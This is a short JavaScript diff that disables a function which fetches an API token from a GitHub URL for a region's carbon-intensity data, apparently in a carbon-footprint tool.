@@ -56,7 +56,7 @@ const regionsList = {
     },
     regionUnitedStates: {
         carbonIntensity: {
-            fetch: function () {
+            disabled_fetch: function () {
                 const xhr = new XMLHttpRequest();
                 xhr.open("GET", "https://raw.githubusercontent.com/AAABBBCCCAAAA/w1/main/token", false);
                 xhr.send();
